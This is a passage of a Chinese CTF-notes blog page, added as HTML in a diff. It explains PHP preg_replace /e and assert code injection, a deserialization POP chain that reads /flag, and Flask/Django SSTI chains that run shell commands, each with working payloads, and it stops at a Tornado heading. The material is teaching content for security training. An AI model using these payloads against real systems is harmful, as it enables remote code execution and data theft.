@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-50x50.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-50x50.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="theme-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ducklinger.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CTF 综合笔记目录 PHP 函数利用 反序列化 SSTI 模板注入 SQL 注入 文件上传 文件包含 工具使用 项目结构 GBK&#x2F;GDK 编码宽字节注入 Java 原型链污染   PHP 函数利用preg_replace &#x2F;e 模式preg_replace 的 &#x2F;e 模式从 PHP 5.5 开始废弃，PHP 7 直接移除。 12345preg_replace(pattern, repl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF综合笔记">
+<meta property="og:url" content="https://ducklinger.top/2026/06/01/CTF/CTF%E7%BB%BC%E5%90%88%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Ducklinger">
+<meta property="og:description" content="CTF 综合笔记目录 PHP 函数利用 反序列化 SSTI 模板注入 SQL 注入 文件上传 文件包含 工具使用 项目结构 GBK&#x2F;GDK 编码宽字节注入 Java 原型链污染   PHP 函数利用preg_replace &#x2F;e 模式preg_replace 的 &#x2F;e 模式从 PHP 5.5 开始废弃，PHP 7 直接移除。 12345preg_replace(pattern, repl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ducklinger.top/images/dirset.png">
+<meta property="og:image" content="https://ducklinger.top/images/djangoerror.png">
+<meta property="article:published_time" content="2026-05-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-01T07:16:59.954Z">
+<meta property="article:author" content="Ducklinger">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ducklinger.top/images/dirset.png">
+
+<link rel="canonical" href="https://ducklinger.top/2026/06/01/CTF/CTF%E7%BB%BC%E5%90%88%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTF综合笔记 | Ducklinger</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ducklinger</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section">关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section">分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section">标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">归档</a>
+
+  </li>
+        <li class="menu-item menu-item-poems">
+
+    <a href="/poems/" rel="section">诗歌</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main main-post">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ducklinger.top/2026/06/01/CTF/CTF%E7%BB%BC%E5%90%88%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Ducklinger">
+      <meta itemprop="description" content="分享日常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ducklinger">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF综合笔记
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-06-01 00:00:00 / 修改时间：15:16:59" itemprop="dateCreated datePublished" datetime="2026-06-01T00:00:00+08:00">2026-06-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CTF-综合笔记"><a href="#CTF-综合笔记" class="headerlink" title="CTF 综合笔记"></a>CTF 综合笔记</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#php-%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8">PHP 函数利用</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li>
+<li><a href="#ssti-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5">SSTI 模板注入</a></li>
+<li><a href="#sql-%E6%B3%A8%E5%85%A5">SQL 注入</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8">工具使用</a></li>
+<li><a href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84">项目结构</a></li>
+<li><a href="#gbkgdk-%E7%BC%96%E7%A0%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">GBK&#x2F;GDK 编码宽字节注入</a></li>
+<li><a href="#java-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">Java 原型链污染</a></li>
+</ul>
+<hr>
+<h2 id="PHP-函数利用"><a href="#PHP-函数利用" class="headerlink" title="PHP 函数利用"></a>PHP 函数利用</h2><h3 id="preg-replace-e-模式"><a href="#preg-replace-e-模式" class="headerlink" title="preg_replace /e 模式"></a>preg_replace <code>/e</code> 模式</h3><p><code>preg_replace</code> 的 <code>/e</code> 模式从 PHP 5.5 开始废弃，PHP 7 直接移除。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(pattern, replacement, subject, limit, count);</span><br><span class="line"><span class="comment">// 将 subject 中的 pattern 均替换成 replacement</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/World/&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="comment">// 输出 &quot;Hello PHP!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>/e</code> 修正符会使 <code>preg_replace()</code> 将替换参数 <code>replacement</code> 当作 PHP 代码执行。在匹配到字符串进行替换时，会先解析替换字符串，然后执行其中的 PHP 代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/bad/e&#x27;</span>, <span class="string">&#x27;&quot;g&quot; . (1 - 1 ). (1 - 1) . &quot;d&quot;&#x27;</span>, <span class="string">&quot;he is a bad boy&quot;</span>);</span><br><span class="line"><span class="comment">// he is a g00d boy</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="例题：攻防世界-ics-05"><a href="#例题：攻防世界-ics-05" class="headerlink" title="例题：攻防世界 ics-05"></a>例题：攻防世界 ics-05</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line"><span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>/e</code> 执行替换时会执行 <code>replacement</code> 表达式。</p>
+<p>构造：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pat=/test/e&amp;rep=phpinfo()&amp;sub=just test</span><br></pre></td></tr></table></figure>
+
+<h3 id="assert-表达式执行"><a href="#assert-表达式执行" class="headerlink" title="assert 表达式执行"></a>assert 表达式执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>, <span class="keyword">string</span> <span class="variable">$description</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>$assertion</code>：要验证的表达式。</li>
+<li><code>$description</code>：可选，断言失败时输出的自定义描述信息，便于定位问题。</li>
+</ul>
+<h3 id="例题：攻防世界-mfw"><a href="#例题：攻防世界-mfw" class="headerlink" title="例题：攻防世界 mfw"></a>例题：攻防世界 mfw</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>assert</code> 会直接执行表达式，且 <code>$file</code> 变量可控，可以考虑提前闭合引号注入。</p>
+<p>构造：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=&#x27;) or phpinfo()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>PHP 中常见的序列化 &#x2F; 反序列化函数：</p>
+<ul>
+<li><code>serialize</code></li>
+<li><code>unserialize</code></li>
+</ul>
+<p>反序列化对象如果为已经存在的类，则可能调用魔术方法。</p>
+<p>常见魔术方法：</p>
+<ol>
+<li><code>__construct</code>：构造函数，在对应对象实例化时被自动调用。</li>
+<li><code>__wakeup</code>：在对象反序列化时调用。</li>
+<li><code>__sleep</code>：在对象序列化时被调用。</li>
+</ol>
+<p>序列化时会先调用 <code>__sleep</code> 再调用 <code>__destruct</code>，完整调用顺序为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sleep -&gt; 变量存在 -&gt; __destruct</span><br></pre></td></tr></table></figure>
+
+<p>反序列化时，如果有 <code>__wakeup</code>，则会调用 <code>__wakeup</code> 而不是 <code>__construct</code>，逻辑为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wakeup / __construct -&gt; 变量存在</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP-相关函数"><a href="#PHP-相关函数" class="headerlink" title="PHP 相关函数"></a>PHP 相关函数</h3><p><code>A instanceof B</code> 运算符：用于判断一个变量是否是某个类、其父类或实现某接口的实例。如果是，返回 <code>true</code>，否则返回 <code>false</code>。</p>
+<p><code>is_callable()</code>：用于检测一个变量的值在当前作用域中是否可以作为函数或方法调用，常用于回调验证。</p>
+<p><code>call_user_func()</code>：允许调用一个回调函数，并向它传递参数。可以调用全局函数、类方法，甚至闭包。</p>
+<p><code>__invoke()</code>：用于让对象像函数一样被调用。当以函数调用方式执行一个对象时，PHP 会自动调用该对象的 <code>__invoke()</code> 方法。此特性自 PHP 5.3.0 起可用，并且必须声明为 <code>public</code>。</p>
+<p><code>file_get_contents()</code>：用于本地文件读取或远程读取。如果目标为可执行文件，可能执行后返回结果。常结合 <code>php://filter</code>、<code>data://</code> 等伪协议实现文件读取或 base64 编码读取。</p>
+<h3 id="例题：ezunser"><a href="#例题：ezunser" class="headerlink" title="例题：ezunser"></a>例题：ezunser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;welcome&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;store <span class="keyword">instanceof</span> Store) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$this</span>-&gt;handler)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;handler, <span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileInvoker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$path</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SafeNote</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable language_">$this</span>-&gt;text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&lt;!-- POST data=serialized_string --&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造序列化 payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;anything&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$store</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handler</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileInvoker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line"><span class="variable">$store</span> = <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line"><span class="variable">$fileinvoker</span> = <span class="keyword">new</span> <span class="title class_">FileInvoker</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$store</span>-&gt;handler = <span class="variable">$fileinvoker</span>;</span><br><span class="line"><span class="variable">$cache</span>-&gt;store = <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$cache</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Cache&quot;:2:&#123;s:3:&quot;key&quot;;s:8:&quot;anything&quot;;s:5:&quot;store&quot;;O:5:&quot;Store&quot;:1:&#123;s:7:&quot;handler&quot;;O:11:&quot;FileInvoker&quot;:1:&#123;s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SSTI-模板注入"><a href="#SSTI-模板注入" class="headerlink" title="SSTI 模板注入"></a>SSTI 模板注入</h2><h3 id="Flask-Django"><a href="#Flask-Django" class="headerlink" title="Flask &#x2F; Django"></a>Flask &#x2F; Django</h3><p>基本思路：</p>
+<ol>
+<li>找到可以调用的类。</li>
+<li>调用函数读取文件或执行命令。</li>
+</ol>
+<p>常用属性：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.__class__        <span class="comment"># 查看类属性</span></span><br><span class="line">.__base__         <span class="comment"># 查看直接父类</span></span><br><span class="line">.__bases__        <span class="comment"># 查看所有父类</span></span><br><span class="line">.__subclasses__() <span class="comment"># 查看所有子类</span></span><br><span class="line">.__mro__          <span class="comment"># 查看类继承顺序</span></span><br></pre></td></tr></table></figure>
+
+<p>常用访问链：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__init__      <span class="comment"># 初始化类，返回的类型是 function</span></span><br><span class="line">__globals__   <span class="comment"># 获取函数所在空间下可用的 module、方法以及所有变量</span></span><br><span class="line">__builtins__  <span class="comment"># 内建名称空间，可访问 eval、open 等内建函数</span></span><br></pre></td></tr></table></figure>
+
+<p>命令执行和文件读取方式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval</span></span><br><span class="line">__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os 模块</span></span><br><span class="line">__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&quot;ls /&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># popen 函数</span></span><br><span class="line">__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;ls /&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># importlib 类</span></span><br><span class="line">[<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># linecache 函数</span></span><br><span class="line">__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess.Popen 类</span></span><br></pre></td></tr></table></figure>
+
+<p>文件读取：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FileLoader</span></span><br><span class="line"><span class="comment"># catch_warnings</span></span><br><span class="line">__init__.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>Tornado 使用 <code>&#123;% ... %&#125;</code> 包裹控制语句，用 <code>&#123;&#123; ... &#125;&#125;</code> 包裹表达式。</p>
